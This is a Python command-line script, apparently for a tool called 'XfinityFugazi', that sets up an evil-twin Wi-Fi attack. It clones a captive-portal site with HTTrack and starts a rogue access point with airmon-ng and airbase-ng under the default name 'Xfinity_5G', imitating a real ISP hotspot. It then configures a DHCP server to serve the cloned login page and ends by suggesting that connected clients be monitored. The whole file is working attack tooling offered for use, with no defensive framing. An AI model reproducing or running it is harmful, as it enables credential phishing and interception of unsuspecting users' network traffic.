
from dhcp import DHCP
from httrack import HTTrack
import argparse
import os
import subprocess

class CLI:
    def start(self):
        parser = argparse.ArgumentParser(description='XfinityFugazi')
        parser.add_argument('-e', '--essid', type=str, help='ESSID of rogue AP', default='Xfinity_5G')
        parser.add_argument('-c', '--channel', type=int, help='Channel of rogue AP', default=1)
        parser.add_argument('-u', '--url', type=str, help='URL of captive portal', default='xfinity/new.html')
        parser.add_argument('-p', '--path', type=str, help='Path to downloaded HTML')
        args = parser.parse_args()

        print("Using the following configuration:")
        print(f"ESSID: {args.essid}")
        print(f"Channel: {args.channel}")
        print(f"URL: {args.url}")
        if args.path:
            print(f"HTML path: {args.path}")

        if args.path and os.path.exists(args.path):
            print("Using downloaded HTML...")
            html_path = args.path
        else:
            print("Downloading website...")
            httrack = HTTrack(args.url, "website_clone")
            httrack.download_website()
            html_path = "website_clone/index.html"

        print("Setting up rogue access point...")
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'])
        subprocess.run(['sudo', 'airmon-ng', 'start', 'wlan0'])
        subprocess.run(['sudo', 'airbase-ng', '-e', args.essid, '-c', str(args.channel), 'wlan0mon'])

        print("Configuring DHCP server...")
        dhcp = DHCP("at0", "192.168.1.1", "255.255.255.0", "192.168.1.100", "192.168.1.200")
        dhcp.configure_dnsmasq(html_path)

        print("Rogue access point setup complete. Monitor the network for connected clients and their activity.")

if __name__ == "__main__":
    cli = CLI()
    cli.start()
